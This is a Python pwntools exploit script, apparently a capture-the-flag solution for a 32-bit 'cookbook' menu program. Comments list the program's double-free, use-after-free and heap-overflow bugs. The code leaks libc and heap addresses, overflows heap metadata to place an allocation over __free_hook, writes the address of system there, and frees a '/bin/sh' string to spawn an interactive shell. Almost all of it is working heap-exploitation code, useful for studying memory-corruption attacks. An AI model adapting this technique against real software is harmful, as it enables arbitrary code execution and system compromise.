from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./cookbook"
bin = ELF(file)
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
#libc = ELF("./libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

conn = process(file)
#conn = gdb.debug(file)

def menu(ch):
    conn.recvuntil("[q]uit")
    conn.sendline(ch)

def list_i():
    menu("l")

def list_r():
    menu("r")

def add_i():
    menu("a")

def add_i_menu(ch):
    conn.recvuntil("(doesn't quit")
    conn.sendline(ch)

def list_current_stats():
    add_i_menu("l")

def new_ingredient():
    add_i_menu("n")

def discard_ingredient():
    add_i_menu("d")

def give_name_to_ingredient(name):
    add_i_menu("g")
    conn.sendline(name)

def price_ingredient(price):
    add_i_menu("p")
    conn.sendline(str(price))

def set_calories(cal):
    add_i_menu("s")
    conn.sendline(str(cal))

def quit_ingredient():
    add_i_menu("q")

def export_ingredient():
    add_i_menu("e")
    conn.recvuntil("saved")

def create_recipe():
    menu("c")

def create_recipe_menu(ch):
    conn.recvuntil("[q]uit")
    conn.sendline(ch)

def new_recipe():
    create_recipe_menu("n")

def discard_recipe():
    create_recipe_menu("d")

def add_ingredient_recipe(name):
    create_recipe_menu("a")
    conn.recvuntil("which ingredient to add?")
    conn.sendline(name)

def remove_ingredient_recipe(name):
    create_recipe_menu("r")
    conn.recvuntil("ingredient to remove?")
    conn.sendline(name)

def give_name_recipe(name):
    create_recipe_menu("g")
    conn.sendline(name)

def save_recipe():
    create_recipe_menu("s")

def print_recipe():
    create_recipe_menu("p")

def quit_recipe():
    create_recipe_menu("q")

def exterminate_i(i):
    menu("e")
    conn.recvuntil("which ingredient")
    conn.sendline(i)

def set_cook_name(size, name):
    menu("g")
    conn.recvuntil("long is ")
    conn.sendline(str(hex(size)))
    conn.send(name)

def remove_cook_name():
    menu("R")

name = "vampire"

conn.recvuntil("name?")
conn.sendline(name)

# Vulnerabilities:
#
# - main_menu - double free cookbook ptr
# - create_recipe - double free + use after
# - give_name_to_recipe - heap overflow

# Leaking libc and heap address

# Adding two chunks in unsorted bin of size 0x90

set_cook_name(0x90, "a\n")
add_i()
new_ingredient()
give_name_to_ingredient("name1")
export_ingredient()
quit_ingredient()
remove_cook_name()
exterminate_i("onion")

add_i()
new_ingredient()
give_name_to_ingredient("name2")
export_ingredient()
quit_ingredient()

list_i()
conn.recvuntil("name2")
conn.recvuntil("calories: ")
libc_leak = int(conn.recvline())
if libc_leak < 0:
    libc_leak += 0x100000000
libc.address = libc_leak - 0xf76d97b0 + 0xf7527000
conn.recvuntil("price: ")
heap_leak = int(conn.recvline())
if heap_leak < 0:
    heap_leak += 0x100000000

create_recipe()
new_recipe()
give_name_recipe("\xff"*0x400)
quit_recipe()

malloc_size = libc.symbols['__free_hook'] - (heap_leak - 0x83a52a8 + 0x83a5818)
set_cook_name(malloc_size, "a\n")
quit_ingredient()
set_cook_name(0x150, "a"*0x10 + p32(libc.symbols['system']) + "\n")

set_cook_name(100, "/bin/sh\x00\n")
remove_cook_name()

log.info("Libc leak: " + hex(libc_leak))
log.info("Heap leak: " + hex(heap_leak))

conn.interactive()
